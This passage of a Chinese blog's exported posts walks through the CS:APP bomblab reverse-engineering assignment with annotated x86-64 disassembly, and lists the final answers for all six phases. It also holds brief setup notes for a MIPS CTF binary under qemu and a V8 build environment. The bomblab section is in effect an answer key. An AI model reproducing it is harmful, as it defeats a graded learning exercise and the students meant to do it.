class="line">  401381:	ba 00 00 00 00       	mov    $0x0,%edx						#是，eax&#x3D;0</span><br><span class="line">  401386:	eb 13                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  401388:	ba 00 00 00 00       	mov    $0x0,%edx</span><br><span class="line">  40138d:	eb 0c                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  40138f:	ba 01 00 00 00       	mov    $0x1,%edx</span><br><span class="line">  401394:	eb 05                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  401396:	ba 01 00 00 00       	mov    $0x1,%edx</span><br><span class="line">  40139b:	89 d0                	mov    %edx,%eax</span><br><span class="line">  40139d:	5b                   	pop    %rbx</span><br><span class="line">  40139e:	5d                   	pop    %rbp</span><br><span class="line">  40139f:	41 5c                	pop    %r12</span><br><span class="line">  4013a1:	c3                   	retq</span><br></pre></td></tr></table></figure>
-
-<p>通过分析可得，当<code>rdi</code>、<code>rsi</code>两个寄存器中地址对应的字符串内容，相等时，返回0，否则，返回1</p>
-<p>综上：</p>
-<p>当输入的字符串的内容和<code>0x402400</code>地址中的内容相等，即可通过。</p>
-<p><img src="/2020/07/24/bomblab/image-20200722183034318.png" alt="image-20200722183034318"></p>
-<p>Border relations with Canada have never been better.</p>
-<h3 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   %rbp</span><br><span class="line">  400efd:	53                   	push   %rbx</span><br><span class="line">  400efe:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  </span><br><span class="line">  400f02:	48 89 e6             	mov    %rsp,%rsi					#当前栈顶备份rsi</span><br><span class="line">  400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt;	#主要是判断是否输入了六个数</span><br><span class="line">  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)					#栈顶数据必须是1</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;		#如果相等，rbx&#x3D;rsp+0x4；rbp&#x3D;rsp+0x18，否则，爆炸</span><br><span class="line">																		#rbp指向最后一个数字的位置,rbx指向rsp下面一个单元</span><br><span class="line">  400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax				#eax初始化是rsp栈顶的数据</span><br><span class="line">  400f1a:	01 c0                	add    %eax,%eax					#eax×2</span><br><span class="line">  400f1c:	39 03                	cmp    %eax,(%rbx)					#eax和rbx的值比较</span><br><span class="line">																		#(也就是下一个单元的数据和上一个单元比较)</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;		</span><br><span class="line">																		#如果相等，rbx+0x4，否则，爆炸</span><br><span class="line">  400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:	48 83 c3 04          	add    $0x4,%rbx					rbx和rbp比较，rbx和rbp如果不相等(没走完6个)，继续循环</span><br><span class="line">  400f29:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;		#rbx和rbp比较如果想等，结束</span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx				#rbx(来判断的指针)，从rsp下面第一个数开始走			</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp		</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:	48 83 c4 28          	add    $0x28,%rsp					#六个走完，就结束了</span><br><span class="line">  400f40:	5b                   	pop    %rbx</span><br><span class="line">  400f41:	5d                   	pop    %rbp</span><br><span class="line">  400f42:	c3                   	retq</span><br></pre></td></tr></table></figure>
-
-<p>所以，phase_2函数做的，就是将栈中的前六个单元的数据，相邻两个比较，如果2×上面单元地址 = 下面单元地址，才不会爆炸，又因为第一个是1（esp的值），六个，所以可以得到：</p>
-<p>栈内情况如下</p>
-<p> <img src="/2020/07/24/bomblab/image-20200722234727371.png" alt="image-20200722234727371"></p>
-<p>对于<code>read_six_numbers</code>函数，主要看一下几行</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40148a:	e8 61 f7 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;		#输入h函数</span><br><span class="line">40148f:	83 f8 05             	cmp    $0x5,%eax					   #eax存放输入的参数个数，说明至少六个才行（eax返回6）</span><br><span class="line">401492:	7f 05                	jg     401499 &lt;read_six_numbers+0x3d&gt;	#JG： 大于转移指令。</span><br><span class="line">401494:	e8 a1 ff ff ff       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401499:	48 83 c4 18          	add    $0x18,%rsp						#小于0x5，顺利退出</span><br><span class="line">40149d:	c3                   	retq</span><br></pre></td></tr></table></figure>
-
-<p>将参数压栈的操作</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400bf0 &lt;__isoc99_sscanf@plt&gt;:</span><br><span class="line">  400bf0:	ff 25 92 24 20 00    	jmpq   *0x202492(%rip)        # 603088 &lt;_GLOBAL_OFFSET_TABLE_+0xa0&gt;</span><br><span class="line">  400bf6:	68 11 00 00 00       	pushq  $0x11</span><br><span class="line">  400bfb:	e9 d0 fe ff ff       	jmpq   400ad0 &lt;_init+0x10&gt;		# jmpq 就是jmp 指令，q表示跳转到64位地址。</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400ad0 &lt;getenv@plt-0x10&gt;:</span><br><span class="line">  400ad0:	ff 35 1a 25 20 00    	pushq  0x20251a(%rip)        # 602ff0 &lt;_GLOBAL_OFFSET_TABLE_+0x8&gt;</span><br><span class="line">  400ad6:	ff 25 1c 25 20 00    	jmpq   *0x20251c(%rip)        # 602ff8 &lt;_GLOBAL_OFFSET_TABLE_+0x10&gt;</span><br><span class="line">  400adc:	0f 1f 40 00          	nopl   0x0(%rax)</span><br></pre></td></tr></table></figure>
-
-<p>应该是0x400ad0做的，，，（猜测）</p>
-<p>1 2 4 8 16 32</p>
-<h3 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp						</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx					#rcx &#x3D; rsp + 0xc</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx					#rdx &#x3D; rsp + 0x8</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi					#esi &#x3D; 0x4025cf</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax						#eax &#x3D; 0x0</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax						</span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;			#至少要输入两个参数</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)					#rsp + 0x8 与 0x7 做比较，需要小于</span><br><span class="line">  400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt;			#rsp + 0x8 大于 0x7 就爆炸了</span><br><span class="line">  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax					#eax &#x3D; rsp + 0x8</span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)				#switch结构</span><br><span class="line">  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax						#eax &#x3D; 0xcf 	207</span><br><span class="line">  400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax						#eax &#x3D; 0x2c3		rsp &#x3D; eax - 0xc</span><br><span class="line">  400f88:	eb 34                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax						#eax &#x3D; 0x100		256						</span><br><span class="line">  400f8f:	eb 2d                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:	b8 85 01 00 00       	mov    $0x185,%eax						#eax &#x3D; 0x185	389</span><br><span class="line">  400f96:	eb 26                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax						#eax &#x3D; 0xce		206</span><br><span class="line">  400f9d:	eb 1f                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax						#eax &#x3D; 0x2aa	682</span><br><span class="line">  400fa4:	eb 18                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax						#eax &#x3D; 0x147	327</span><br><span class="line">  400fab:	eb 11                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;			#爆炸</span><br><span class="line">  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400fb7:	eb 05                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax					#比较eax 和 rsp + 0xc</span><br><span class="line">  400fc2:	74 05                	je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:	e8 71 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  400fcd:	c3                   	retq</span><br></pre></td></tr></table></figure>
-
-<p>这个阶段，只需要对该代码有较好的理解即可，主要是对分支（switch语句）的理解。</p>
-<p>对于sscanf函数，原型</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sscanf(const char* str,const char* format,...);</span><br></pre></td></tr></table></figure>
-
-<p>在这里，<code>esi</code>里面存放的是format的内容，<code>[esp+4]</code>、<code>[esp+0xc]</code>里面分别是第一第二个参数</p>
-<p><img src="/2020/07/24/bomblab/image-20200723015133883.png" alt="image-20200723015133883"></p>
-<p><img src="/2020/07/24/bomblab/image-20200723020444125.png" alt="image-20200723020444125"></p>
-<p>根据format和这两条语句，可以知道，参数为2。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f60:	83 f8 01             	cmp    $0x1,%eax						</span><br><span class="line">400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;			#至少要输入两个参数		#至少要输入两个参数</span><br></pre></td></tr></table></figure>
-
-<p>下面到了重点，也就是switch语句。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)				#switch结构</span><br><span class="line">400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax						#eax &#x3D; 0xcf 	207</span><br><span class="line">400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax</span><br></pre></td></tr></table></figure>
-
-<p>到内存中查看0x402470和0x402478</p>
-<p><img src="/2020/07/24/bomblab/image-20200723020928192.png" alt="image-20200723020928192"></p>
-<p><code>0x402470</code>是当rax=0时，<code>jmpq   *0x402470(,%rax,8)</code>调转到地址<code>0x402470</code>,当rax=1时，<code>jmpq   *0x402470(,%rax,8)</code>调转到地址<code>0x400fb9</code>，一次类推，只要eax属于（0，0xx7），就有它对应的解</p>
-<ul>
-<li>0    0xcf            207</li>
-<li>1    0x137         311</li>
-<li>2    0x2c3          707</li>
-<li>3    0x100          256</li>
-<li>4    0x185          389</li>
-<li>5    0xce            206</li>
-<li>6    0x2aa          682</li>
-<li>7    0x147          327</li>
-</ul>
-<p>共有八组解，都可以使用</p>
-<p>另外，如果不想奋斗看汇编，其实，可以ida里面看伪代码，分分钟秒杀</p>
-<p><img src="/2020/07/24/bomblab/image-20200723021624745.png" alt="image-20200723021624745"></p>
-<h3 id="第四阶段"><a href="#第四阶段" class="headerlink" title="第四阶段"></a>第四阶段</h3><p>读懂程序，就可以简单绕过了</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:	48 83 ec 18          	sub    $0x18,%rsp						</span><br><span class="line">  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  40101f:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401024:	e8 c7 fb ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:	83 f8 02             	cmp    $0x2,%eax						#参数必须是两个</span><br><span class="line">  40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)					#第一个参数必须小于等于0xe</span><br><span class="line">  401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt;			</span><br><span class="line">  401035:	e8 00 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx						#edx &#x3D; 0xe</span><br><span class="line">  40103f:	be 00 00 00 00       	mov    $0x0,%esi						#esi &#x3D; 0x0</span><br><span class="line">  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi					#edi &#x3D; rsp+0x8</span><br><span class="line">  401048:	e8 81 ff ff ff       	callq  400fce &lt;func4&gt;					#func4</span><br><span class="line">  40104d:	85 c0                	test   %eax,%eax						#eax必须等于0</span><br><span class="line">  40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt;			</span><br><span class="line">  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)					#rsp + 0xc 要等于 0x0</span><br><span class="line">  401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:	e8 dd 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  401061:	c3                   	retq</span><br></pre></td></tr></table></figure>
-
-<p>这个函数中，得到的消息有，参数必须是两个，其中，第一个不确定，在经过<code>fun4函数</code>后，<code>eax</code>返回值要是0，第二个参数必须是0。</p>
-<p>在<code>fun4</code>之前，<code>edx = 0xe</code>、<code>esi = 0x0</code>、<code>edi = rsp+0x8</code>,是fun4的三个参数</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  400fce:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400fd2:	89 d0                	mov    %edx,%eax		#eax &#x3D; edx &#x3D; 0xe</span><br><span class="line">  400fd4:	29 f0                	sub    %esi,%eax		#eax &#x3D; eax - esi(0x0)</span><br><span class="line">  400fd6:	89 c1                	mov    %eax,%ecx		#ecx &#x3D; eax</span><br><span class="line">  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx		#ecx左移5位 &#x3D;&gt; ecx &#x3D; 0</span><br><span class="line">  400fdb:	01 c8                	add    %ecx,%eax		#eax &#x3D; eax + ecx</span><br><span class="line">  400fdd:	d1 f8                	sar    %eax				#右移1位	eax &#x3D; 7</span><br><span class="line">  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx	#ecx &#x3D; rax + rsi * 1 7</span><br><span class="line">  400fe2:	39 f9                	cmp    %edi,%ecx			#edi(第一个参数)与ecx比较</span><br><span class="line">  400fe4:	7e 0c                	jle    400ff2 &lt;func4+0x24&gt;	#如果edi &lt;&#x3D; ecx</span><br><span class="line">  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx		#edi &gt; ecx，edx &#x3D; rcx -1</span><br><span class="line">  400fe9:	e8 e0 ff ff ff       	callq  400fce &lt;func4&gt;		#递归</span><br><span class="line">  400fee:	01 c0                	add    %eax,%eax</span><br><span class="line">  400ff0:	eb 15                	jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax  		#如果ecx小于等于edi，eax &#x3D; 0</span><br><span class="line">  400ff7:	39 f9                	cmp    %edi,%ecx		#如果edi &gt;&#x3D; ecx#结束</span><br><span class="line">  400ff9:	7d 0c                	jge    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi			#esi &#x3D; rcx + 1</span><br><span class="line">  400ffe:	e8 cb ff ff ff       	callq  400fce &lt;func4&gt;			#递归</span><br><span class="line">  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax	#eax &#x3D; rax + rax + 1</span><br><span class="line">  401007:	48 83 c4 08          	add    $0x8,%rsp				#结束</span><br><span class="line">  40100b:	c3                   	retq</span><br></pre></td></tr></table></figure>
-
-<p>在执行两次判断之前，<code>eax = 7</code>，接下来是将输入的第一个参数和<code>eax</code>，做比较，第一次如果小于等于，则得到想要的<code>eax=0</code>，再一次比较，如果大于等于，就结束了，所以，相等，即可顺利通过，也就是第一个参数是7.</p>
-<p>所以，第四阶段 7 0</p>
-<h3 id="第五阶段"><a href="#第五阶段" class="headerlink" title="第五阶段"></a>第五阶段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401067:	48 89 fb             	mov    %rdi,%rbx				#rbx &#x3D; rdi(读入的数据)</span><br><span class="line">40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax			#rax &#x3D; canary</span><br><span class="line">401071:	00 00 </span><br><span class="line">401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)			#rsp+0x18 &#x3D; rax &#x3D; canary</span><br><span class="line">401078:	31 c0                	xor    %eax,%eax				#eax &#x3D; 0</span><br><span class="line">40107a:	e8 9c 02 00 00       	callq  40131b &lt;string_length&gt;	#求长度</span><br><span class="line">40107f:	83 f8 06             	cmp    $0x6,%eax				</span><br><span class="line">401082:	74 4e                	je     4010d2 &lt;phase_5+0x70&gt;	#长度必须等于6</span><br></pre></td></tr></table></figure>
-
-<p>要求输入的字符串长度必须是6</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401089:	eb 47                	jmp    4010d2 &lt;phase_5+0x70&gt;	#eax &#x3D; 0</span><br><span class="line">40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx		#ecx &#x3D; rbx + rax × 1</span><br><span class="line">40108f:	88 0c 24             	mov    %cl,(%rsp)				#(rsp) &#x3D; cl(ecx低16位)ecx</span><br><span class="line">401092:	48 8b 14 24          	mov    (%rsp),%rdx				#rdx &#x3D; (rsp) &#x3D; cl(ecx低16位)</span><br><span class="line">401096:	83 e2 0f             	and    $0xf,%edx				#edx &amp; 0xf(只要edx的低四位)</span><br><span class="line">401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx		#edx &#x3D; rdx + 0x4024b0</span><br><span class="line">						0x4024b0 &lt;array.3449&gt;:	&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br><span class="line">4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)	#rsp + rax × 1 + 0x10 &#x3D; dl(edx的低4位)</span><br><span class="line">4010a4:	48 83 c0 01          	add    $0x1,%rax				#rax + 1</span><br><span class="line">4010a8:	48 83 f8 06          	cmp    $0x6,%rax				#rax与6比较</span><br><span class="line">4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;</span><br></pre></td></tr></table></figure>
-
-<p>进行了一顿操作，将<code>rax</code>（偏移从0到6） + <code>rbx</code>（输入的）的低4位，在字符串（<code>&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</code>）中找到对应的字符，放入<code>rsp + rax × 1 + 0x10</code>内地址对应的区域，一直放了6个字符</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi			#esi &#x3D; 0x40245e &quot;flyers&quot;</span><br><span class="line"></span><br><span class="line">4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi			#rdi &#x3D; (rsp + 0x10)</span><br><span class="line">4010bd:	e8 76 02 00 00       	callq  401338 &lt;strings_not_equal&gt; #rdi和rsi</span><br><span class="line">4010c2:	85 c0                	test   %eax,%eax				</span><br><span class="line">4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt;	#字符串必须一样</span><br></pre></td></tr></table></figure>
-
-<p>然后将那个地址的字符，放入<code>rdi</code>中，进行字符串比较，要求和内存单元<code>0x40245e</code>里面的一样，也就是字符串<code>&quot;flyers&quot;</code></p>
-<p>综上，所以，我们需要的偏移，在对应上面的字符串<code>maduiersnfotvby</code>上找，是9、15、14、5、6、7，也就是我们输入的六个可见字符，他们的低4位需要对应以上数，对应ascii码表，可以区数字部分的，0对应0x30，刚好。</p>
-<p><img src="/2020/07/24/bomblab/image-20200723212445995.png" alt="image-20200723212445995"></p>
-<p>所以，也就是9?&gt;567</p>
-<h3 id="第六阶段"><a href="#第六阶段" class="headerlink" title="第六阶段"></a>第六阶段</h3><p>由于最后一个有点复杂，直接在ida里进行分析</p>
-<p>主要分为五个小节</p>
-<p>第一小节，判断输入数据的合法性</p>
-<p><img src="/2020/07/24/bomblab/image-20200724034848651.png" alt="image-20200724034848651"></p>
-<p>结论：需要输入的数据[1,6]，且两两互不相等</p>
-<p>第二小节，对输入的数据进行小小变换操作</p>
-<p><img src="/2020/07/24/bomblab/image-20200724035019549.png" alt="image-20200724035019549"></p>
-<p>结论：原来输入的数据，变成了<code>7-原数据</code></p>
-<p>第三小节，将node链表根据输入重新排列到新的地方</p>
-<p><img src="/2020/07/24/bomblab/image-20200724035051039.png" alt="image-20200724035051039"></p>
-<p>因为语句<code>v6 = (int *)*((_QWORD *)v6 + 1);</code>中， <code>+1</code>通过转换加的是qword数据，根据下面图可以，<code>+1</code>后便是下一个node的地址。</p>
-<p>因为每次取出输入变换的数据<code>v8</code>，取链上node，一直取，直到走了<code>v8</code>步才停下，赋给了<code>v17..</code>这里的数据</p>
-<p><img src="/2020/07/24/bomblab/image-20200724035203891.png" alt="image-20200724035203891"></p>
-<p>第五小节，判断链上的数据，是否递减排列</p>
-<p><img src="/2020/07/24/bomblab/image-20200724035304948.png" alt="image-20200724035304948"></p>
-<p>node上数据</p>
-<ul>
-<li>1 0x14c</li>
-<li>2 0x0a8</li>
-<li>3 0x39c</li>
-<li>4 0x2b3</li>
-<li>5 0x1dd</li>
-<li>6 0x1bb</li>
-</ul>
-<p>所以，从大到小排列：3 4 5 6 1 2</p>
-<p>7 - 原数据 = 现数据</p>
-<p>原数据 = 7 - 现数据</p>
-<p>结果：4 3 2 1 6 5</p>
-<p>Border relations with Canada have never been better.</p>
-<p>1 2 4 8 16 32</p>
-<p>0 207</p>
-<p>7 0</p>
-<p>9?&gt;567</p>
-<p>4 3 2 1 6 5</p>
-<p><img src="/2020/07/24/bomblab/image-20200724040224131.png" alt="image-20200724040224131"></p>
-]]></content>
-      <tags>
-        <tag>csapp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>embedded(未完成)</title>
-    <url>/2020/10/22/embedded/</url>
-    <content><![CDATA[<h2 id="embedded"><a href="#embedded" class="headerlink" title="embedded"></a>embedded</h2><h3 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h3><p>mips架构的题，ida没法反编译成伪代码，用反编译mips的工具<code>ghidra</code>，安装包在文件夹里。windows下运行<code>ghidraRun.bat</code>,linux下执行<code>ghidraRun</code>,emm,需要有jdk的环境。</p>
-<h3 id="传文件到qemu"><a href="#传文件到qemu" class="headerlink" title="传文件到qemu"></a>传文件到qemu</h3><p>将linux下的embedded_heap文件传入qemu：</p>
-<p>linux：sudo ifconfig tap0 12.0.0.2</p>
-<p>qemu：ifconfig eth0 12.0.0.1 </p>
-<p>遇到设备不存在，ifconfig，在开头看网卡名字</p>
-<p>ping通</p>
-<p>linux：python -m SimpleHTTPServer</p>
-<p>qemu：wget  12.0.0.2:8000/embedded_heap</p>
-<p><img src="/2020/10/22/embedded/image-20200831110650474.png" alt="image-20200831110650474"></p>
-<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>将两个so.0文件放到/lib文件下（注意：是根目录，，，）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mv libuClibc-0.9.33.2.so libc.so.0</span><br><span class="line">$ mv ld-uClibc-0.9.33.2.so ld-uClibc.so.0</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/10/22/embedded/image-20200831191612015.png" alt="image-20200831191612015"></p>
-<p>qemu-mips  -L ./ ./embedded_heap</p>
-<p>也可以直接<code>./embedded_heap</code></p>
-<p>【可以使用的原因可能是因为binutils的存在用编译器自动转换了】</p>
-<p><strong>注意</strong></p>
-<p>还要修改lib文件下链接文件的权限</p>
-<p><img src="/2020/10/22/embedded/image-20200831191636914.png" alt="image-20200831191636914"></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/" target="_blank" rel="noopener">https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/</a></p>
-<p><a href="https://zybuluo.com/H4l0/note/1633971" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1633971</a></p>
-<hr>
-<h3 id="交叉编译环境"><a href="#交叉编译环境" class="headerlink" title="交叉编译环境"></a>交叉编译环境</h3><p><a href="https://baike.baidu.com/item/交叉编译/10916911" target="_blank" rel="noopener">交叉编译</a>（cross-compilation）是指，在某个主机平台上（比如PC上）用<a href="https://baike.baidu.com/item/交叉编译器/5125452" target="_blank" rel="noopener">交叉编译器</a>编译出可在其他平台上（比如ARM上）运行的代码的过程。</p>
-]]></content>
-      <categories>
-        <category>mips pwn</category>
-      </categories>
-      <tags>
-        <tag>iot</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>v8环境搭建</title>
-    <url>/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>搭个环境而已，花了我n久，哭泣。。。</p>
-<p>这里就讲下自己搭环境的经过，，，</p>
-<hr>
-<p>使用的环境：ubuntu 18.04</p>
-<h2 id="初次尝试：本地"><a href="#初次尝试：本地" class="headerlink" title="初次尝试：本地"></a>初次尝试：本地</h2><h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p>主要参考的是这两篇博客：</p>
-<p><a href="https://eternalsakura13.com/2018/05/06/v8/" target="_blank" rel="noopener">https://eternalsakura13.com/2018/05/06/v8/</a></p>
-<p><a href="https://bbs.pediy.com/thread-252812.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-252812.htm</a></p>
-<hr>
-<h3 id="vpn"><a href="#vpn" class="headerlink" title="vpn"></a>vpn</h3><blockquote>
-<p>我的本地代理，开了没用，不知道为什么，本机可以上google，但是虚拟机里怎么都不可以，，，然后，，选择在虚拟机里面使用vpn</p>
-</blockquote>
-<p>这个是我用的：<a href="https://neworld.date/user（简单好用而且不贵）" target="_blank" rel="noopener">https://neworld.date/user（简单好用而且不贵）</a></p>
-<p>linux的教程：<a href="https://support.neworld.date/linux/（不要用自动配置，一次性的，后面出问题了，还是要上手动配置）" target="_blank" rel="noopener">https://support.neworld.date/linux/（不要用自动配置，一次性的，后面出问题了，还是要上手动配置）</a></p>
-<p>别的问题不大，注意的两点是：</p>
-<p>1.要使用的时候，需要在命令前面加上<code>proxychains4</code></p>
-<p>2.选择节点的时候，一定要选择有人的</p>
-<p>3.一定是root账户</p>
-<p>4.在/root目录下</p>
-<p>执行命令 <code>proxychains4 curl myip.ipip.net</code> 。如果显示empty server类似的</p>
-<p>那就重新来一遍（建议：wmware弄个快照，，每次都重新配，心真的很累），，，我当时玄学，学校里的网不行（貌似是因为校园网不能翻外网），连了自己的热点就可以了。</p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install binutils python2.7 perl socat git build-essential gdb gdbserver</span><br></pre></td></tr></table></figure>
-
